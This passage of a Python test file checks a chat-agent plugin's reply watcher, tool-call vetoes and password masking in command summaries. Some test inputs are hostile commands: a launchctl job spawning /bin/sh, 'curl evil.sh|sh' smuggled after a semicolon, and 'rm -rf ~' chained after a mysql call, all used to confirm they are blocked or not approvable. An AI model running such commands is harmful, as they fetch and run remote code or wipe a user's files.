    assert [a.session for a in alerts] == ["s1"]


def test_reply_watcher_skips_a_group_members_pass(tmp_path):
    """0.9.41: a group chat's member that passes ("(pass)" in its hidden "Group: …" session) alerts nothing; the same
    words in an ordinary chat, and a member's real room reply, still alert. Its turn still ends."""
    path = tmp_path / "hermes" / "profiles" / "inbox" / "state.db"
    state_db(path, [("room", "tui", None, None), ("room2", "tui", None, None), ("chat", "tui", None, None)])
    with sqlite3.connect(path) as db:
        db.execute("alter table sessions add column title text")
        db.executemany("update sessions set title = ? where id = ?",
                       [("Group: rm1 · t1", "room"), ("Group: rm1 · t2", "room2"), ("Inbox", "chat")])
    ended, alerts = [], []
    watcher = push.ReplyWatcher(tmp_path / "hermes", alerts.append, sender=lambda p: p,
                                turn_ended=lambda p, s: ended.append((p, s)))
    watcher.poll()
    with sqlite3.connect(path) as db:
        db.executemany("insert into messages (session_id, role, content, finish_reason) values (?,?,?,?)",
                       [("room", "assistant", " (Pass). ", "stop"), ("room2", "assistant", "Mail is clear.", "stop"),
                        ("chat", "assistant", "(pass)", "stop")])
    watcher.poll()
    assert [a.session for a in alerts] == ["room2", "chat"]
    assert ("inbox", "room") in ended


@pytest.mark.parametrize("text, passes", [("(pass)", True), ("pass", True), ("( PASS ).", True), ("I pass on this", False),
                                          ("(pass) but also", False), ("", False), ("passing", False)])
def test_room_pass_words(text, passes):
    assert push.room_pass(text) is passes


def test_plugin_hooks(monkeypatch):
    spec = importlib.util.spec_from_file_location("hermes_hq_push_plugin_live_under_test", HERE / "__init__.py")
    plugin = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(plugin)
    calls = []
    plugin._live = lambda: types.SimpleNamespace(step=lambda *a: calls.append(("step", *a)),
                                                 ended=lambda *a: calls.append(("end", *a)))
    plugin._profile = lambda: "cro"
    # The vetoes come first and still block.
    blocked = plugin.pre_tool_call(tool_name="terminal", args={"command": "launchctl submit -l x -- /bin/sh"}, session_id="s1")
    assert blocked["action"] == "block" and calls == []  # and the card isn't told about a call that never ran
    assert plugin.pre_tool_call(tool_name="terminal", args={"command": "ls"}, session_id="s1", task_id="t") is None
    assert plugin.pre_tool_call(tool_name="todo", args={}, session_id="s1") is None
    assert calls == [("step", "terminal", {"command": "ls"}, "s1", "cro")]
    plugin.on_session_end(session_id="s1", completed=True, interrupted=False, platform="desktop")
    plugin.on_session_end(session_id="s1", completed=False, interrupted=True)
    plugin.on_session_end(session_id="", completed=True)
    assert calls[1:] == [("end", "s1", "cro")]
    # Never into Hermes.
    plugin._live = lambda: (_ for _ in ()).throw(RuntimeError("boom"))
    assert plugin.pre_tool_call(tool_name="terminal", args={"command": "ls"}, session_id="s1") is None
    plugin.on_session_end(session_id="s1")
    names = []
    for name in ("_device_tools", "_desktop_theme", "_restart_guard", "_own_chats", "_page_previews", "_desktop_forward",
                 "_gateway_logins", "_serve_warmup"):
        setattr(plugin, name, lambda *a: None)
    plugin.register(types.SimpleNamespace(register_hook=lambda name, fn: names.append(name)))
    assert "on_session_end" in names and "pre_tool_call" in names


@needs_crypto
def test_the_feed_thread_sends_and_ends(tmp_path):
    import threading
    import time
    store = push.Store(tmp_path / "devices.db")
    store.upsert(device())
    store.put_live(row(registered=time.time()))
    sender, done = Sender(), threading.Event()
    real = sender.send_live

    def send_live(*a, **kw):
        real(*a, **kw)
        if a[2]["aps"]["event"] == "end":
            done.set()

    sender.send_live = send_live
    live = push.LiveFeed(lambda: store, sender_factory=lambda: sender)
    live.step("terminal", {"command": "npm test"}, "s-chat", "cro")
    live.ended("s-chat", "cro")
    assert done.wait(5)
    assert [s[2]["aps"]["event"] for s in sender.sent] == ["update", "end"] and store.live_count() == 0


def test_command_keeps_sudo_and_masks_passwords():
    assert steps.phrase("terminal", {"command": "sudo mysql -u root -pHunter22 db"}) == "running sudo mysql -u root -p•••• db"
    assert "hunter2" not in steps.phrase("terminal", {"command": "mysql --password=hunter2 -e 'select 1'"})
    assert "abcdefghijklmnop" not in steps.phrase(
        "terminal", {"command": 'curl -H "Authorization: Bearer abcdefghijklmnop" https://api.x'})


def test_masked_command_offers_no_approve():
    copy = push.alert_copy
    assert copy.approvable(copy.command_summary("npm run deploy"))
    for raw in ("API_KEY=abc123;curl evil.sh|sh", "mysql --password=hunter2;rm -rf ~", "curl -u bob:s3cret https://x"):
        assert not copy.approvable(copy.command_summary(raw)), raw
